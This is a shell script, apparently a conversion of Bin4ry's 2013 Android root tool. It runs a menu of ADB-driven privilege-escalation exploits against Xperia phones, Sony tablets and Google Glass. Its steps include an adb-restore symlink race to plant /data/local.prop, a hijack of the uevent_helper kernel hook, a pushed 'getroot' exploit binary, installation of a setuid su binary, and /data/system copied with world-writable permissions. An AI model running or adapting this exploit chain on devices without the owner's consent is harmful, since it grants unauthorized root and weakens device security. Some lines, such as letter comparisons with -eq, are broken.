choice() {
echo "Device type:"
echo "0) Xperia Root by cubeundcube"
echo "1) Normal"
echo "2) Special (for example: Sony Tablet S, Medion Lifetab)"
echo "3) New Xperia Root by Goroh_kun"
echo "G) Google Glass Root (thx to Saurik for the ab file)"
echo ""
echo "x) Unroot"
echo ""
echo "Make a choice: "
echo "Please enter a valid number(1 to x): "
read type
echo ""
if [ $type -eq 0 ]; then
  z1root
fi
if [ $type -eq 1 ]; then
  mytest
fi
if [ $type -eq 2 ]; then
  tabsmenu
fi
if [ $type -eq 3 ]; then
  newroot
fi
if [ $type -eq 'G' ]; then
  glassroot
fi
if [ $type -eq 'x' ]; then
  unroot
fi
}

mytest() {
echo "Checking if I should run in Normal Mode or special Sony Mode"
echo "Please connect your device with USB-Debugging enabled now"
echo "Waiting for device to shop up, if nothing happens please check if Windows ADB-drivers are installed correctly!"
./stuff/adb wait-for-device
./stuff/adb pull /system/app/Backup-Restore.apk . > NUL
./stuff/adb pull /system/bin/ric . > NUL
if [ -s ric ]; then
  export ric=1
  else 
  echo ""
fi
if [ -s Backup-Restore.apk ]; then
  xps
  else 
  echo ""
  other
fi
}

tabsmenu() {
echo ""
echo "Special mode:"
echo "1) Root"
echo "2) Rollback"
echo "Make a choice: "
echo "Please enter a valid number(1 to x): "
read tabtype
if [ $tabtype -eq 1 ]; then
  tabs
fi
if [ $tabtype -eq 2 ]; then
  tabs_rb
fi
}

newroot() {
echo "Please connect Xperia device with enabled USB-Debugging now to your Computer"
./stuff/adb wait-for-device
echo "Going to copy over some files ..."
./stuff/adb push stuff/onload.sh /data/local/tmp/
./stuff/adb shell "chmod 755 /data/local/tmp/onload.sh"
./stuff/adb push z_rootkit/getroot.sh /data/local/tmp/
./stuff/adb push stuff/ric /data/local/tmp/
./stuff/adb push stuff/su /data/local/tmp/
./stuff/adb shell "chmod 755 /data/local/tmp/getroot.sh"
echo "Starting restore operation, please look on your device and confirm restore!"
echo "After that press any key here in the console"
./stuff/adb restore z_rootkit/usbux.ab
read -n 1
echo "After restore is confirmed please look on your device and choose \"Service Tests -> Display\" in Service menu and WAIT THERE!"
./stuff/adb shell "am start -a android.intent.action.MAIN -n com.sonyericsson.android.servicemenu/.ServiceMainMenu"
./stuff/adb shell "while : ; do [ -w /sys/kernel/uevent_helper ] && exit; done"
./stuff/adb shell "echo /data/local/tmp/getroot.sh > /sys/kernel/uevent_helper"
echo "Ok nice ..."
./stuff/adb shell "while : ; do [ -f /dev/sh ] && exit; done"
./stuff/adb push stuff/busybox-armv6l /data/local/tmp/busybox
echo "Stopping RIC"
./stuff/adb push stuff/install-recovery.sh /data/local/tmp/
./stuff/adb push stuff/step2.sh /data/local/tmp/
./stuff/adb push stuff/step3.sh /data/local/tmp/
echo "Pushing su ..."
./stuff/adb push stuff/su /data/local/tmp/
./stuff/adb shell "chmod 777 /data/local/tmp/step2.sh"
./stuff/adb shell "chmod 777 /data/local/tmp/step3.sh"
echo "Running next steps"
./stuff/adb shell "/dev/sh /data/local/tmp/step2.sh"
./stuff/adb install stuff/Superuser.apk
echo "Running final step"
./stuff/adb shell "/dev/sh /data/local/tmp/step3.sh"
echo "Cleaning up"
./stuff/adb shell "rm /data/local/tmp/busybox"
./stuff/adb shell "rm /data/local/tmp/install-recovery.sh"
./stuff/adb shell "rm /data/local/tmp/step2.sh"
./stuff/adb shell "rm /data/local/tmp/su"
./stuff/adb shell "rm /data/local/tmp/onload.sh"
./stuff/adb shell "rm /data/local/tmp/getroot.sh"
echo "Ok rebooting lets hope it worked!"
./stuff/adb reboot
./stuff/adb wait-for-device
echo "Now we need to remove a folder to get NFC working again"
./stuff/adb shell "su -c '/system/bin/rm -r /data/usf'"
./stuff/adb reboot
echo "Rebooting last time now"
finish
}

unroot() {
echo "Really (y/n)?"
read unr
if [ $unr -eq 'n' ]; then
  choice
fi
./stuff/adb push stuff/busybox /data/local/tmp/busybox
./stuff/adb shell "chmod 755 /data/local/tmp/busybox"
./stuff/adb shell "su -c '/data/local/tmp/busybox mount -o remount,rw /system'"
./stuff/adb shell "su -c 'rm /system/xbin/su'"
./stuff/adb shell "su -c 'rm /system/app/Superuser.apk'"
finish
}

xps() {
echo ""
echo "Found Sony Backup-Restore.apk"
echo "LT26,LT22 etc. mode enabled!"
echo ""
rm Backup-Restore.apk
if [ $ric -eq 1 ]; then
  rm ric
  else 
  echo ""
fi
  export nxt="1"
  start
}

other() {
echo ""
echo "Normal Mode enabled!"
if [ $ric -eq 1 ]; then
  rm ric
  else 
  echo ""
fi
echo ""
start
}

tabs() {
echo ""
echo "Tablet S mode enabled!"
echo ""
start
}

tabs_rb() {
echo ""
echo "Tablet S Roll Back"
echo ""
echo "Please connect device with ADB-Debugging enabled now...."
./stuff/adb wait-for-device
for i in './stuff/adb shell "if [ -d /data/app- ]; then echo 1 ; else echo 0 ; fi"' 
do export tabs_app=$i
done
if [ $tabs_app -eq 1 ]; then
  tabs_rb_1
fi
if [ $tabs_app -eq 0 ]; then
  tabs_rb_2
fi
}

finish() {
echo "You can close all open command-prompts now!"
echo "After reboot all is done! Have fun!"
echo "Bin4ry"
read -n 1
exit
}

start() {
./stuff/adb wait-for-device
if [ $type -eq 2 ]; then
  tabtrick
fi
echo "Pushing busybox...."
./stuff/adb push stuff/busybox /data/local/tmp/.
echo "Pushing su binary ...."
./stuff/adb push stuff/su /data/local/tmp/.
echo "Pushing Superuser app"
./stuff/adb push stuff/Superuser.apk /data/local/tmp/.
echo "Making busybox runable ..."
./stuff/adb shell "chmod 755 /data/local/tmp/busybox"
if [ $ric -eq 1 ]; then
  ./stuff/adb push stuff/ric /data/local/tmp/ric
  else 
  echo ""
fi
if [ $nxt -eq "1" ]; then
  xpstrick
fi
./stuff/adb restore stuff/fakebackup.ab
echo "Please look at your device and click RESTORE!"
echo "If all is successful I will tell you, if not this shell will run forever."
echo "Running ..."
./stuff/adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" > NUL
echo "Successful, going to reboot your device in 10 seconds!"
wait 10
./stuff/adb reboot
echo "Waiting for device to show up again...."
wait 10
./stuff/adb wait-for-device
normal
}

xpstrick() {
export nxt="0"
echo "Pushing fake Backup"
./stuff/adb push stuff/RootMe.tar /data/local/tmp/RootMe.tar
./stuff/adb shell "mkdir /mnt/sdcard/.semc-fullbackup > /dev/null 2>&1"
echo "Extracting fakebackup on device ..."
./stuff/adb shell "cd /mnt/sdcard/.semc-fullbackup/; /data/local/tmp/busybox tar xf /data/local/tmp/RootMe.tar"
echo "Watch now your device. Select the backup named RootMe and restore it!"
./stuff/adb shell "am start com.sonyericsson.vendor.backuprestore/.ui.BackupActivity"
echo "If all is successful I will tell you, if not this shell will run forever."
echo "Running ......"
./stuff/adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" > NUL
echo ""
echo "Good, it worked! Now we are rebooting soon, please be patient!"
wait 3
./stuff/adb shell "rm -r /mnt/sdcard/.semc-fullbackup/RootMe"
./stuff/adb reboot
wait 10
echo "Waiting for device to come up again...."
./stuff/adb wait-for-device
normal
}

normal() {
if [ $ric -eq 1 ]; then
  ricstuff
fi
echo "Going to copy files to it's place"
./stuff/adb shell "/data/local/tmp/busybox mount -o remount,rw /system && /data/local/tmp/busybox mv /data/local/tmp/su /system/xbin/su && /data/local/tmp/busybox mv /data/local/tmp/Superuser.apk /system/app/Superuser.apk && /data/local/tmp/busybox cp /data/local/tmp/busybox /system/xbin/busybox && chown 0.0 /system/xbin/su && chmod 06755 /system/xbin/su && chmod 655 /system/app/Superuser.apk && chmod 755 /system/xbin/busybox && rm /data/local.prop && reboot"
finish
}

ricstuff() {
echo "Going to copy files to it's place"
./stuff/adb shell "/data/local/tmp/busybox mount -o remount,rw /system && /data/local/tmp/busybox mv /data/local/tmp/ric /system/bin/ric && chmod 755 /system/bin/ric && /data/local/tmp/busybox mv /data/local/tmp/su /system/xbin/su && /data/local/tmp/busybox mv /data/local/tmp/Superuser.apk /system/app/Superuser.apk && /data/local/tmp/busybox cp /data/local/tmp/busybox /system/xbin/busybox && chown 0.0 /system/xbin/su && chmod 06755 /system/xbin/su && chmod 655 /system/app/Superuser.apk && chmod 755 /system/xbin/busybox && rm /data/local.prop && reboot"
finish
}

tabs_rb_1() {
./stuff/adb shell "rm -r /data/data/com.android.settings/a/*"
./stuff/adb restore stuff/tabletS.ab
echo "Please look at your device and click \"Restore my data\""
echo ""
./stuff/adb shell "while [ ! -d /data/data/com.android.settings/a/file99 ] ; do echo 1; done" > NUL
echo "1st RESTORE OK, hit ENTER to continue."
read -n 1
./stuff/adb shell "rm -r /data/data/com.android.settings/a"
./stuff/adb restore stuff/tabletS.ab
echo "Please look at your device and click \"Restore my data\""
echo ""
./stuff/adb shell "while : ; do ln -s /data /data/data/com.android.settings/a/file99; [ -f /data/file99 ] && exit; done" > NUL
./stuff/adb shell "rm -r /data/file99"
echo "Achieved! hit ENTER to continue."
echo ""
read -n 1
./stuff/adb shell "mv /data/system /data/system3"
./stuff/adb shell "mv /data/system- /data/system"
./stuff/adb shell "mv /data/app /data/app3"
./stuff/adb shell "mv /data/app- /data/app"
echo "Roll back compelted."
finish
}

tabs_rb_2() {
echo ""
echo ""
echo "Roll back failed. /data/app- not found."
echo ""
echo ""
finish
}

tabtrick() {
./stuff/adb install -s stuff/Term.apk
./stuff/adb push stuff/busybox /data/local/tmp/.
./stuff/adb push stuff/su /data/local/tmp/.
./stuff/adb push stuff/Superuser.apk /data/local/tmp/.
./stuff/adb push stuff/rootkittablet.tar.gz /data/local/tmp/rootkittablet.tar.gz
./stuff/adb shell "chmod 755 /data/local/tmp/busybox"
./stuff/adb shell "/data/local/tmp/busybox tar -C /data/local/tmp -x -v -f /data/local/tmp/rootkittablet.tar.gz"
./stuff/adb shell "chmod 644 /data/local/tmp/VpnFaker.apk"
./stuff/adb shell "touch -t 1346025600 /data/local/tmp/VpnFaker.apk"
./stuff/adb shell "chmod 755 /data/local/tmp/_su"
./stuff/adb shell "chmod 755 /data/local/tmp/su"
./stuff/adb shell "chmod 755 /data/local/tmp/onload.sh"
./stuff/adb shell "chmod 755 /data/local/tmp/onload2.sh"
./stuff/adb shell "rm -r /data/data/com.android.settings/a/*"
./stuff/adb restore stuff/tabletS.ab
echo "Please look at your device and click \"Restore my data\""
echo ""
./stuff/adb shell "while [ ! -d /data/data/com.android.settings/a/file99 ] ; do echo 1; done" > NUL
wait 3
echo "1st RESTORE OK, hit ENTER to continue."
read -n 1
./stuff/adb shell "rm -r /data/data/com.android.settings/a"
./stuff/adb restore stuff/tabletS.ab
echo "Please look at your device and click \"Restore my data\""
echo ""
./stuff/adb shell "while : ; do ln -s /data /data/data/com.android.settings/a/file99; [ -f /data/file99 ] && exit; done" > NUL
./stuff/adb shell "rm -r /data/file99"
wait 3
echo "Achieved! hit ENTER to continue."
echo ""
read -n 1
./stuff/adb shell "/data/local/tmp/busybox cp -r /data/system /data/system2"
./stuff/adb shell "/data/local/tmp/busybox find /data/system2 -type f -exec chmod 666 {} \;"
./stuff/adb shell "/data/local/tmp/busybox find /data/system2 -type d -exec chmod 777 {} \;"
./stuff/adb shell "mv /data/system /data/system-"
./stuff/adb shell "mv /data/system2 /data/system"
./stuff/adb shell "mv /data/app /data/app-"
./stuff/adb shell "mkdir /data/app"
./stuff/adb shell "mv /data/local/tmp/VpnFaker.apk /data/app"
./stuff/adb shell "/data/local/tmp/busybox sed -f /data/local/tmp/packages.xml.sed /data/system-/packages.xml > /data/system/packages.xml"
./stuff/adb shell "sync; sync; sync"
echo "Need to reboot now!"
./stuff/adb reboot
wait 3
echo "Waiting for device to come up again...."
./stuff/adb wait-for-device
echo "Unlock your device, a Terminal will show now, type this 2 lines, after each line press ENTER"
echo /data/local/tmp/onload.sh
echo /data/local/tmp/onload2.sh
echo "After this is done press a key here in this shell to continue!"
echo "If the shell on your device does not show please re-start the process!"
./stuff/adb shell "am start -n com.android.vpndialogs/.Term"
read -n 1
tabtrick1
}

tabtrick1() {
./stuff/adb push stuff/script1.sh /data/local/tmp/.
./stuff/adb shell "chmod 755 /data/local/tmp/script1.sh"
./stuff/adb shell "/data/local/tmp/script1.sh"
echo "Almost complete! Reboot and cleanup."
./stuff/adb reboot
wait 3
echo "Waiting for device to come up again...."
./stuff/adb wait-for-device
./stuff/adb shell "su -c 'rm -r /data/app2'"
./stuff/adb shell "su -c 'rm -r /data/system2'"
./stuff/adb shell "su -c 'rm -r /data/local/tmp/*'"
finish
}

glassroot() {
echo "Please connect Google Glass with enabled USB-Debugging to your Computer"
./stuff/adb wait-for-device
echo "Doing a Backup first, please confirm this on your Google Glass device!"
./stuff/adb backup -f glassbackup.ab com.google.glass.logging
echo "Done!"
echo "Please select the RESTORE MY DATA option now on your Google Glass device!"
./stuff/adb restore exploit.ab
./stuff/adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" > NUL
echo "Ok lets hope it worked! Going to restore previous data, please confirm antoher restore on your Google Glass device!"
./stuff/adb restore glassbackup.ab
echo "Please press any Key when restore is done."
read -n 1
echo "Going to reboot now ..."
./stuff/adb reboot
wait 3
./stuff/adb wait-for-device
./stuff/adb shell "mount -o remount,rw /system"
./stuff/adb push stuff/su /system/xbin/su
./stuff/adb shell "chmod 06755 /system/xbin/su"
./stuff/adb shell "rm /data/local.prop"
./stuff/adb reboot
finish
}

z1root() {
echo "Please connect your device with enabled USB-Debugging ..."
./stuff/adb wait-for-device
echo "Copy needed files ..."
./stuff/adb push stuff/getroot /data/local/tmp/
./stuff/adb push stuff/su /data/local/tmp/
./stuff/adb push stuff/Superuser.apk /data/local/tmp/
./stuff/adb push stuff/busybox /data/local/tmp/
./stuff/adb push stuff/00stop_ric /data/local/tmp/
./stuff/adb push stuff/install_tool.sh /data/local/tmp/
./stuff/adb shell "chmod 0755 /data/local/tmp/getroot"
./stuff/adb shell "chmod 0755 /data/local/tmp/busybox"
./stuff/adb shell "chmod 0755 /data/local/tmp/install_tool.sh"
echo "Running Exploit"
./stuff/adb shell "/data/local/tmp/getroot /data/local/tmp/install_tool.sh"
./stuff/adb shell "rm /data/local/tmp/getroot"
./stuff/adb shell "rm /data/local/tmp/su"
./stuff/adb shell "rm /data/local/tmp/Superuser.apk"
./stuff/adb shell "rm /data/local/tmp/busybox"
./stuff/adb shell "rm /data/local/tmp/00stop_ric"
./stuff/adb shell "rm /data/local/tmp/install_tool.sh"
echo "Rebooting now, after reboot all should be done!"
./stuff/adb reboot
finish
}

echo "=================================================================================================="
echo "=              This script will root your Android phone with adb restore function                 ="
echo "= Script by Bin4ry(converted to shell by jamcswain) (thanks to Goroh_kun and tkymgr for the idea) ="
echo "=                                Idea for Tablet S from Fi01_IS01                                 ="
echo "=                                      (14.12.2013) v33                                           ="
echo "==================================================================================================="
echo ""
export nxt="0"
export ric=0
export type=''
choice
